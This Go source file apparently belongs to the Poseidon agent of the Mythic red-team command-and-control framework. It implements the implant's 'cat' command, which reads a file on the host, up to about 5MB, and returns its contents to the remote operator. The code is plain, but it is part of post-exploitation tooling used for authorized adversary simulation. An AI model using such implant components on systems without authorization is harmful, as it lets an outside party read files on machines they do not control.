package cat

import (
	// Standard

	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/files"
	"os"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Run - package function to run cat
func Run(task structs.Task) {
	msg := task.NewResponse()
	f, err := os.Open(task.Params)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	info, err := f.Stat()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	if info.Size() > (5 * files.FILE_CHUNK_SIZE) {
		msg.SetError(fmt.Sprintf("File size > 5MB, please download instead"))
		task.Job.SendResponses <- msg
		return
	}
	data := make([]byte, int(info.Size()))
	n, err := f.Read(data)
	if err != nil && n == 0 {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	msg.UserOutput = string(data)
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
